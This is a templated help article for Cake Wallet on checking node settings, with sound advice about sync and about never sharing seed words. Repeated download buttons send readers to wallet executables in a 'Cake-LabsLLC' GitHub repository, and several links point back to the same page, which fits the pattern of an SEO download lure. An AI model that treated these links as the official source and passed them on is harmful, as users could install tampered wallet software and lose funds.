<p align="center"><img src="https://github.com/Cake-LabsLLC/learn/raw/HEAD/assets/banner-article.png" alt="Cake Wallet article banner" width="100%"></p>

<h1 align="center">Review node settings in Cake Wallet | Cake Wallet</h1>
<p align="center">Practical, private steps for resolving this Cake Wallet question.</p>

<p align="center">
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe"><img src="https://img.shields.io/badge/Download_for_Windows-2B2733?style=for-the-badge&logo=windows&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for Windows"></a>
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-2B2733?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for macOS"></a>
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip"><img src="https://img.shields.io/badge/Download_for_Linux-2B2733?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [Cake-Wallet-Windows-v6.5.1.exe](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe) | v6.5.1 |
| macOS | [Cake-Wallet-MacOS-v6.5.1.dmg](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg) | v6.5.1 |
| Linux | [Cake-Wallet-linux-v6.5.1.zip](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip) | v6.5.1 |

All versions and checksums are on the [Cake Wallet v6.5.1 release page](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/tag/v6.5.1).

## Short answer

Node settings affect how a wallet connects and synchronizes. Change them only when you understand the setting, and never enter seed words or keys into node fields.

## You'll see this if

- You are trying to resolve a stalled sync, have changed connection settings, or want to understand why a wallet is not showing current information.
- You are unsure which safe troubleshooting step to try next.
- You want to protect wallet recovery information while resolving the issue.

## Why it happens

A wallet uses a node connection to access blockchain data. A node choice or connection issue can affect synchronization, but node settings are separate from wallet recovery secrets. Exact options and screen labels can vary, so rely on the controls actually shown by your app rather than assuming a particular menu or feature.

## Fix

1. Confirm that the device has a normal internet connection and that the app is not simply still scanning.
2. Open the settings screen and locate the node-related options. Read the descriptions in the app before changing anything.
3. If you entered a custom node, verify that you intended to use it and trust its source. If unsure, return to a configuration offered within the app rather than copying an address from a stranger.
4. Change one setting at a time and allow the wallet to reconnect. Observe whether sync progresses before making another change.
5. If the wallet was restored recently, check its restore height too. Earlier is safer when you need older history, but scanning takes longer.
6. For additional context, read [Cake Wallet sync troubleshooting](./cake-wallet-not-syncing.md) and review official information in the [Cake Wallet repository](https://github.com/Cake-LabsLLC/cake-wallet-desktop).

> [!TIP]
> Keep a written record of non-secret troubleshooting details. Never include seed words, keys, PINs, or recovery screenshots in that record.

See [Cake Wallet sync troubleshooting](./cake-wallet-not-syncing.md) and [desktop help](./how-to-use-cake-wallet-desktop.md).

For another perspective, read the [Cake Wallet related guide](./cake-wallet-not-syncing.md).

---

## If that did not work

If settings changes do not help, restore the previous configuration if you recorded it and can do so safely. Avoid guessing values or using a node supplied in a direct message. Preserve wallet data and make sure you have a private recovery backup before considering reinstalling. If you suspect a malicious configuration or credential exposure, stop using it and seek trusted, general guidance without revealing secrets.

A few careful checks can make this process less confusing. First separate wallet access from recovery: a PIN or a desktop launch issue is not the same thing as seed validity, and node connectivity is not a substitute for recovery details. Write down the non-secret symptoms you observe, such as the wording of an error, whether the app opens, or whether scanning advances. This helps you compare behavior without exposing private information.

Avoid making several changes at once. If you change a restore option, node setting, or installation state, you may not know which change affected the result. Where practical, note the original non-secret setting before changing it. Give scans time to complete, particularly after a restore that starts earlier in the blockchain. A longer scan is not necessarily evidence that the wallet or backup is broken.

Protect yourself from recovery scams throughout troubleshooting. A person who asks you to reveal a seed, private key, PIN, or recovery screenshot is asking for information that should remain yours. Do not use a site or chat as a seed checker. Official-looking language does not make an unsolicited request safe. Keep the words out of email, shared documents, and screen recordings.

If you need to change devices or installations, plan the recovery first. Keep the existing app and its data intact until you have confirmed that you can restore from your own backup. Cake Wallet can restore a MyMonero seed, including the 13-word MyMonero-specific legacy format or the 25-word standard Monero format. Newer wallets may use a different seed format; check the word count your backup shows. Do not combine formats or guess missing words.

Use the linked guides as background, not as a reason to disclose any secret. They describe adjacent topics such as recovery, synchronization, privacy, and migration. Menu wording can vary, so follow the general options presented in your own app rather than searching for an exact label that may not appear. If a troubleshooting step would require surrendering control of your device or revealing recovery information, stop and choose a safer route.

A successful check should leave you with a clear distinction between what you know and what remains uncertain. For example, you can confirm that a backup has a particular word count without publishing the words, or note that a sync indicator has not moved without sending a screen image containing keys. Keep that distinction in mind when asking for general help.


> [!WARNING]
> A seed or private key can provide control of a wallet. Never send it to support, enter it on a website, or disclose it to someone offering to recover funds.

See [another Cake Wallet help article](./cake-wallet-node-settings.md) for related guidance.

## Prevention

Use only node information you trust and understand. Treat node addresses as configuration, not as places to enter recovery words. Keep the wallet and its backup protected, and be cautious of messages promising special nodes or faster synchronization in exchange for a seed. Nobody legitimate asks for your seed or spend keys.



---

## FAQ

<details><summary>Should I share my seed with support?</summary>

No. Nobody legitimate asks for your seed, keys, or PIN. Keep recovery information private and enter it only in the genuine app when needed.

</details>

<details><summary>Does a PIN replace my recovery backup?</summary>

No. A PIN protects access on an installation. Keep a separate, complete recovery backup in a private place.

</details>

<details><summary>Can I use a MyMonero seed?</summary>

Cake Wallet can restore a MyMonero seed. MyMonero used a 13-word MyMonero-specific legacy seed or a 25-word standard Monero seed.

</details>

<details><summary>What if the wallet looks empty after recovery?</summary>

Allow scanning to finish and check the restore height. An earlier height can find older activity but takes longer to scan.

</details>

---

## Download Cake Wallet Desktop

- Windows: [Cake-Wallet-Windows-v6.5.1.exe](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe)
- macOS: [Cake-Wallet-MacOS-v6.5.1.dmg](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg)
- Linux: [Cake-Wallet-linux-v6.5.1.zip](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip)

Check each file against the checksums on the [Cake Wallet v6.5.1 release](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/tag/v6.5.1) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [Troubleshoot Cake Wallet desktop not opening | Cake Wallet](./cake-wallet-app-not-opening.md) | Practical, private steps for resolving this Cake Wallet question. |
| [Cake Wallet on macOS Cannot Be Opened](./cake-wallet-macos-cannot-be-opened.md) | Resolve a macOS warning carefully by checking the download source, then opening the app deliberately. |
| [Cake Wallet Windows SmartScreen Warning](./cake-wallet-windows-smartscreen.md) | Understand a Windows warning without turning off protection or overlooking a suspicious download. |

[Back to all Cake Wallet guides](https://github.com/Cake-LabsLLC/learn)
